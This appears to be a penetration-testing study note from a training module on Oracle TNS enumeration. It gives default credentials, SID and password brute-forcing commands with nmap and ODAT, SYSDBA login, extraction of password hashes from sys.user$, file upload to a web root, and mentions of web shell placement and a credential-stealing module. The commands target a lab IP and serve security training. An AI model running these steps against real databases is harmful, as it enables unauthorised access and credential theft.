---
tags: [enumeration, enumeration/oracle_tns]
module: footprinting
last_updated: 2026-05-10
source_count: 1
---

# Oracle TNS Enumeration

Oracle TNS enumeration: SID brute-forcing with nmap/odat, sqlplus authentication, privilege escalation to sysdba, password hash extraction, and file upload via utlfile.

## Overview

Oracle TNS (Transparent Network Substrate) is Oracle's proprietary network protocol for database communication. It listens on **TCP port 1521** by default. Oracle databases are common in enterprise environments (healthcare, finance, retail).

Key concepts:
- **SID** (System Identifier): unique name for a database instance. Must be known to connect.
- **tnsnames.ora**: client-side config mapping SID names to network addresses
- **listener.ora**: server-side config defining what the listener handles

## Key Concepts / Techniques

### Configuration Files

| File | Location | Purpose |
|------|----------|---------|
| `tnsnames.ora` | `$ORACLE_HOME/network/admin/` | Client-side service name resolution |
| `listener.ora` | `$ORACLE_HOME/network/admin/` | Server-side listener configuration |

### Default Credentials

| Version | Account | Password |
|---------|---------|---------|
| Oracle 9 | Any | `CHANGE_ON_INSTALL` |
| Oracle DBSNMP | dbsnmp | `dbsnmp` |
| Common | scott | `tiger` |
| Oracle 10+ | (none set) | (must configure) |

### SID Enumeration

The SID must be known to connect. Methods:
1. **Nmap**: `oracle-sid-brute` script
2. **ODAT**: `sidguesser` module
3. **Common SIDs**: `XE` (Oracle Express Edition), `ORCL`, `PROD`, `DEV`

### Privilege Escalation to SYSDBA

If a regular user account is found (e.g., `scott/tiger`), attempt to connect as SYSDBA:

```sql
sqlplus scott/tiger@<IP>/XE as sysdba
```

This may succeed if `scott` has been granted SYSDBA privileges or if the database is misconfigured.

### ODAT Capabilities

ODAT (Oracle Database Attack Tool) is the primary Oracle enumeration framework. Modules include:
- `sidguesser` — SID brute-force
- `passwordguesser` — credential brute-force
- `utlfile` — file read/write via UTL_FILE package
- `externaltable` — file read via external tables
- `dbmsxslprocessor` — file upload
- `java` — Java stored procedure execution
- `privesc` — privilege escalation checks

## Commands / Syntax

```bash
# Setup ODAT (if not installed)
sudo apt-get install -y build-essential python3-dev libaio1
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init && git submodule update
sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome

# Nmap — discover TNS listener
sudo nmap -p1521 -sV 10.129.204.235 --open

# Nmap — SID brute-force
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# ODAT — run all modules
./odat.py all -s 10.129.204.235

# ODAT — SID guessing only
./odat.py sidguesser -s 10.129.204.235

# ODAT — password guessing (after finding SID)
./odat.py passwordguesser -s 10.129.204.235 -d XE

# Connect with sqlplus (regular user)
sqlplus scott/tiger@10.129.204.235/XE

# Connect with sqlplus as SYSDBA
sqlplus scott/tiger@10.129.204.235/XE as sysdba

# Fix shared library error for sqlplus
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig

# SQL enumeration queries
SQL> select table_name from all_tables;
SQL> select * from user_role_privs;
SQL> select name, password from sys.user$;         # Extract password hashes (sysdba required)

# Upload file via ODAT utlfile
echo "test content" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger \
    --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Verify upload
curl -X GET http://10.129.204.235/testing.txt
```

## Flags & Options

### sqlplus

| Syntax | Description |
|--------|-------------|
| `user/pass@host/SID` | Connect to specific SID |
| `user/pass@host/SID as sysdba` | Connect with SYSDBA privilege |
| `select * from all_tables` | All visible tables |
| `select * from user_role_privs` | Current user's roles |
| `select name, password from sys.user$` | Password hashes (requires DBA) |

### ODAT Modules

| Module | Description |
|--------|-------------|
| `all` | Run all modules |
| `sidguesser` | Brute-force SID |
| `passwordguesser` | Brute-force credentials |
| `utlfile` | File read/write via UTL_FILE |
| `externaltable` | Read files via external tables |
| `dbmsxslprocessor` | File upload |
| `java` | Execute via Java stored procedures |
| `privesc` | Check privilege escalation paths |
| `stealremotepwds` | Credential stealing |

## Version Detection & Exploit Research

Oracle TNS Listener version information is available unauthenticated via the `VERSION` service request. The listener returns a version string that maps to a specific Oracle Database release (major version + PSU/CPU patch level). Oracle patch cycles are quarterly; unpatched Oracle installations frequently have critical CVEs. The version also determines which ODAT modules are applicable.

### Extracting Version Information

| Method | Command | What It Reveals |
|--------|---------|-----------------|
| Nmap service scan | `nmap -sV -p1521 <IP>` | TNS listener version string |
| Nmap oracle-tns-version | `nmap -p1521 --script oracle-tns-version <IP>` | Detailed listener version |
| ODAT all modules | `./odat.py all -s <IP>` | Version + SID list + available attack paths |
| SQL query (authenticated) | `SELECT * FROM v$version;` | Full Oracle DB version + edition |
| SQL query (authenticated) | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';` | Oracle product version string |

**Oracle version string format:** `Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production`
- Major: 11g, 12c, 18c, 19c, 21c
- Patch: PSU (Patch Set Update) or CPU (Critical Patch Update) number — critical for CVE scoping

### Searching for Exploits

```bash
# Searchsploit
searchsploit oracle
searchsploit "oracle tns"
searchsploit "oracle database"

# Metasploit
msf6> search type:exploit name:oracle
msf6> search type:auxiliary name:oracle
```

### Notable CVEs

| CVE | Affected Versions | Impact |
|-----|------------------|--------|
| CVE-2012-1675 | Oracle 11.1–11.2, 10.2 | TNS Poison — MITM attack via listener registration; no auth required |
| CVE-2009-1979 | Oracle 10g, 11g | TNS Listener command injection — unauthenticated RCE via EXTPROC |
| CVE-2022-21500 | Oracle Database 19c–21c | Pre-auth information disclosure via web-based console |
| CVE-2010-0886 | Oracle JRE (bundled) | JNLP sandbox escape — code execution |
| Multiple (quarterly) | All versions | Oracle CPUs release patches quarterly; always check the [Oracle CPU page](https://www.oracle.com/security-alerts/) for the specific version |

## Gotchas & Notes

- **PL/SQL Exclusion List** (`PlsqlExclusionList`): Oracle can blacklist certain packages. If ODAT modules fail, the target may have exclusion lists configured.
- **SID `XE`** is Oracle Express Edition — extremely common for development and small deployments. Always try it first.
- **The password `tiger` for `scott`**: This is Oracle's canonical demonstration account. It is genuinely used in tutorials and left in production databases.
- **SYSDBA = God mode**: Once connected as sysdba, you can extract all password hashes from `sys.user$`, read/write files, and execute OS commands if Java is enabled.
- **Web shell upload path**: If the Oracle server runs IIS or Apache, ODAT's utlfile can write a web shell to the web root. Know the common paths: Linux `/var/www/html`, Windows `C:\inetpub\wwwroot`.
- **TNS listener on different ports**: Oracle 8i/9i allows remote administration; 10g/11g does not by default. Check for non-standard ports if 1521 is closed.
- **cx_Oracle dependency**: ODAT requires the cx_Oracle Python package which requires Oracle instant client libraries. The setup is complex; document the setup process for repeatability.

## Related Pages

- [[enumeration/_overview]]
- [[tools/attack/odat]]
- [[enumeration/mysql]]
- [[enumeration/mssql]]

## Sources

- raw/footprinting/host_based_enumeration_oracle_tns.md
